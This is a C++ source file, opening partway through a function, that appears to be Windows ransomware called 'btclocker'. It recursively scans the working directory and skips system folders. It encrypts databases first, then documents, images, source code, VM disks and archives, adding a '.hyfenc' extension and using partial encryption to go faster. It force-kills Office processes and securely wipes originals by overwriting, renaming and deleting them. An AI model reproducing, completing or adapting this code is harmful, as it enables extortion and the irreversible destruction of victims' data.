    // 检查文件是否存在
    if (!fs::exists(path)) {
        std::cout << "文件不存在: " << path << std::endl;
        return true;
    }

    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fileSize = { 0 };

    try {
        // 1. 打开文件（移除FILE_FLAG_OVERLAPPED标志，避免参数错误）
        hFile = CreateFileW(
            path.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,  // 允许其他进程读写
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, // 移除FILE_FLAG_OVERLAPPED
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            // 如果无法以读写模式打开，尝试只读模式获取文件信息
            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
                std::cout << "无法访问文件，可能被系统锁定: " << path << std::endl;
                return false;
            }
            throw std::runtime_error("无法打开文件进行安全删除。错误代码: " + std::to_string(error));
        }

        // 2. 获取文件大小
        if (!GetFileSizeEx(hFile, &fileSize)) {
            DWORD error = GetLastError();
            CloseHandle(hFile);
            throw std::runtime_error("无法获取文件大小。错误代码: " + std::to_string(error));
        }

        // 处理空文件
        if (fileSize.QuadPart == 0) {
            CloseHandle(hFile);
            // 直接删除空文件
            return DeleteFileW(path.c_str());
        }

        // 3. 单次随机数据覆写
        const DWORD bufferSize = 64 * 1024; // 极速模式：单次覆写
        std::vector<BYTE> randomBuffer(bufferSize);

        // 使用密码学安全的随机数生成器
        NTSTATUS status = BCryptGenRandom(NULL, randomBuffer.data(), bufferSize, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            // 回退到标准随机数生成器
            std::random_device rd;
            std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());
            std::generate(randomBuffer.begin(), randomBuffer.end(), rng);
        }

        LARGE_INTEGER offset = { 0 };
        DWORD bytesWritten = 0;
        LONGLONG remainingBytes = fileSize.QuadPart;

        // 分块覆写文件
        while (remainingBytes > 0) {
            DWORD chunkSize = static_cast<DWORD>((bufferSize < remainingBytes) ? bufferSize : remainingBytes);

            // 设置写入位置
            offset.QuadPart = fileSize.QuadPart - remainingBytes;
            if (!SetFilePointerEx(hFile, offset, NULL, FILE_BEGIN)) {
                DWORD error = GetLastError();
                throw std::runtime_error("设置文件指针失败。错误代码: " + std::to_string(error));
            }

            // 写入随机数据
            if (!WriteFile(hFile, randomBuffer.data(), chunkSize, &bytesWritten, NULL)) {
                DWORD error = GetLastError();
                // 如果是访问被拒绝错误，可能是文件被锁定
                if (error == ERROR_ACCESS_DENIED) {
                    std::cout << "文件被锁定，无法安全删除: " << path << std::endl;
                    CloseHandle(hFile);
                    return false;
                }
                throw std::runtime_error("写入随机数据失败。错误代码: " + std::to_string(error));
            }

            if (bytesWritten != chunkSize) {
                throw std::runtime_error("部分写入错误。预期: " + std::to_string(chunkSize) +
                    ", 实际: " + std::to_string(bytesWritten));
            }

            remainingBytes -= chunkSize;
        }

        // 4. 强制刷新到磁盘
        FlushFileBuffers(hFile);
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        // 5. 文件名混淆
        fs::path tempPath = path;
        std::random_device nameRd;
        std::mt19937 nameGen(nameRd());
        std::uniform_int_distribution<> nameDis(0, 15);

        // 随机重命名2-3次
        int renameCount = 2 + (nameDis(nameGen) % 2);
        for (int i = 0; i < renameCount; ++i) {
            std::stringstream newName;
            newName << "del_";
            for (int j = 0; j < 8; ++j) {
                newName << std::hex << nameDis(nameGen);
            }
            newName << ".tmp";

            fs::path newPath = path.parent_path() / newName.str();
            try {
                fs::rename(tempPath, newPath);
                tempPath = newPath;
            }
            catch (const fs::filesystem_error&) {
                // 重命名失败不影响主要流程
                break;
            }
        }

        // 6. 最终删除
        bool deleteSuccess = DeleteFileW(tempPath.c_str());

        if (deleteSuccess) {
            std::cout << "安全删除成功: " << path << std::endl;
        }
        else {
            DWORD error = GetLastError();
            std::cerr << "最终删除失败: " << tempPath << " 错误: " << error << std::endl;
        }

        return deleteSuccess;
    }
    catch (const std::exception& e) {
        std::cerr << "安全删除失败 " << path << ": " << e.what() << std::endl;

        // 极速模式：直接删除文件
        std::error_code ec;
        if (fs::remove(path, ec)) {
            std::cout << "已使用极速删除方式移除文件: " << path << std::endl;
            return true;
        }

        std::cerr << "极速删除也失败: " << path << " 错误: " << ec.message() << std::endl;
        return false;
    }
}

// 遍历目录并加密文件 - 修复版（确保先加密数据库文件，再加密其他文件）
inline void traverseAndEncryptAsync(const fs::path& directoryPath,
    const std::vector<std::string>& extensions,
    const BYTE* key) {
    try {
        // 检查目录是否有效
        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
            std::cerr << "无效目录: " << directoryPath << std::endl;
            return;
        }

        // 创建异步加密管理器
        AsyncEncryptionManager manager;

        // 初始化计数器
        size_t totalFiles = 0;
        size_t dbFileCount = 0;
        size_t otherFileCount = 0;
        size_t skippedFiles = 0;
        size_t smallFileCount = 0;
        size_t largeFileCount = 0;

        // 系统文件模式，这些文件通常无法访问或不应修改
        static const std::vector<std::wstring> systemPatterns = {
            L"WindowsApps",
            L"Windows",
            L"System32",
            L"$Recycle.Bin",
            L"ProgramData\\Microsoft\\Windows",
            L"AppData",
            L"Temp",
            L"Temporary Internet Files",
            L"WinSxS",
            L"DriverStore",
            L"Assembly",
            L"Microsoft.NET",
            L"ServiceProfiles",
            L"System Volume Information"
        };

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        // 用于存储分类的文件
        std::vector<std::pair<fs::path, bool>> databaseFiles;    // <文件路径, 是否数据库文件>
        std::vector<std::pair<fs::path, bool>> otherFiles;

        std::cout << "开始扫描目录: " << directoryPath << std::endl;

        try {
            // 单次遍历：同时收集数据库文件和其他文件
            for (const auto& entry : fs::recursive_directory_iterator(
                directoryPath, fs::directory_options::skip_permission_denied)) {

                // 跳过非普通文件
                if (!entry.is_regular_file()) continue;

                // 检查是否是系统文件
                std::wstring filePath = entry.path().wstring();
                bool isSystemFile = false;
                for (const auto& pattern : systemPatterns) {
                    if (filePath.find(pattern) != std::wstring::npos) {
                        isSystemFile = true;
                        skippedFiles++;
                        break;
                    }
                }

                if (isSystemFile) continue;

                // 获取文件扩展名并转换为小写
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                // 检查是否是数据库文件
                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();

                // 检查扩展名是否在目标列表中
                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                    [&](const std::string& targetExt) {
                        std::string lowerTarget = targetExt;
                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                        return ext == lowerTarget;
                    });

                if (shouldEncrypt) {
                    if (isDatabaseFile) {
                        databaseFiles.emplace_back(entry.path(), true);
                    }
                    else {
                        otherFiles.emplace_back(entry.path(), false);
                    }

                    // 统计文件大小分类
                    size_t fileSize = entry.file_size();
                    if (fileSize < 1024 * 1024) {
                        smallFileCount++;
                    }
                    else {
                        largeFileCount++;
                    }
                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "目录扫描出错: " << e.what() << std::endl;
        }
        catch (...) {
            std::cerr << "目录扫描出错: Unknown exception" << std::endl;
        }

        // 统计文件数量
        dbFileCount = databaseFiles.size();
        otherFileCount = otherFiles.size();
        totalFiles = dbFileCount + otherFileCount;

        std::cout << "扫描完成，找到 " << totalFiles << " 个文件" << std::endl;
        std::cout << "  数据库文件: " << dbFileCount << " 个" << std::endl;
        std::cout << "  其他文件: " << otherFileCount << " 个" << std::endl;
        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;

        // 第一阶段：处理数据库文件
        if (!databaseFiles.empty()) {
            std::cout << "\n第一阶段：开始处理 " << dbFileCount << " 个数据库文件..." << std::endl;

            auto startTime = std::chrono::steady_clock::now();

            for (const auto& fileInfo : databaseFiles) {
                const auto& filePath = fileInfo.first;

                // 创建加密后的文件名
                fs::path outputFile = filePath;
                outputFile += ".hyfenc";

                // 添加加密任务
                manager.addTask(filePath, outputFile, key);

                std::cout << "已添加数据库文件加密任务: " << filePath << std::endl;
            }

            // 等待第一阶段任务完成
            try {
                manager.waitForCompletion();
            }
            catch (const std::exception& e) {
                std::cerr << "第一阶段等待完成时出错: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "第一阶段等待完成时出错: Unknown exception" << std::endl;
            }

            auto endTime = std::chrono::steady_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
            std::cout << "第一阶段完成，耗时: " << duration.count() << " ms" << std::endl;
        }

        // 第二阶段：处理非数据库文件
        if (!otherFiles.empty()) {
            std::cout << "\n第二阶段：开始处理 " << otherFileCount << " 个非数据库文件..." << std::endl;

            auto startTime = std::chrono::steady_clock::now();

            for (const auto& fileInfo : otherFiles) {
                const auto& filePath = fileInfo.first;

                // 创建加密后的文件名
                fs::path outputFile = filePath;
                outputFile += ".hyfenc";

                // 添加加密任务
                manager.addTask(filePath, outputFile, key);

                std::cout << "已添加非数据库文件加密任务: " << filePath << std::endl;
            }

            // 等待第二阶段任务完成
            try {
                manager.waitForCompletion();
            }
            catch (const std::exception& e) {
                std::cerr << "第二阶段等待完成时出错: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "第二阶段等待完成时出错: Unknown exception" << std::endl;
            }

            auto endTime = std::chrono::steady_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
            std::cout << "第二阶段完成，耗时: " << duration.count() << " ms" << std::endl;
        }

        std::cout << "\n加密完成统计:" << std::endl;
        std::cout << "  总计文件: " << totalFiles << " 个" << std::endl;
        std::cout << "  数据库文件: " << dbFileCount << " 个" << std::endl;
        std::cout << "  其他文件: " << otherFileCount << " 个" << std::endl;

        // 显示加密统计信息
        manager.printStatistics();

        std::cout << "加密策略: " << std::endl;
        std::cout << "  数据库文件: 全文件加密" << std::endl;
        std::cout << "  非数据库文件: " << std::endl;
        std::cout << "    - 小于1MB: 加密文件头部4KB" << std::endl;
        std::cout << "    - 大于等于1MB: 分块加密15%" << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "严重错误: " << e.what() << std::endl;
    }
    catch (...) {
        std::cerr << "严重错误: Unknown exception" << std::endl;
    }
}
// 主函数
inline int encrypthf() {
    bool hwAccelSupported = IsAesNiSupported();
    std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

    if (!hwAccelSupported) {
        std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
            << "Encryption will be performed in software mode, which may be slower." << std::endl;
    }

    // 关闭可能占用文件的应用程序
    system("taskkill /f /im winword.exe > nul 2>&1");
    system("taskkill /f /im excel.exe > nul 2>&1");
    system("taskkill /f /im powerpnt.exe > nul 2>&1");
    Sleep(500);

    // 生成随机密钥
    BYTE encryptionKey[KEY_LENGTH];
    GenerateRandomKey(encryptionKey, KEY_LENGTH);
    if (!SaveKeyToDocuments(encryptionKey, KEY_LENGTH, L"btclocker_key.bin")) {
        std::cerr << "Failed to save encryption key!" << std::endl;
        return 1;
    }

    // 目标文件扩展名
    std::vector<std::string> extensions = {
       ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
       ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
       ".qbb", ".qbo", ".ofx",
       ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
       ".psd", ".ai", ".dwg", ".skp",
       ".vmdk", ".iso", ".pfx", ".pems",
       ".pst", ".mbox", ".mpp",
       ".jar", ".zip", ".tar.gz",
       ".ppt", ".jpg", ".png", ".txtx", ".jpeg"
    };
    fs::path targetDirectory = fs::current_path();
    std::cout << "Target directory: " << targetDirectory << std::endl;

    // 使用异步加密管理器
    traverseAndEncryptAsync(targetDirectory, extensions, encryptionKey);

    return 0;
}

#endif // ENCRYPTION_UTILS_H
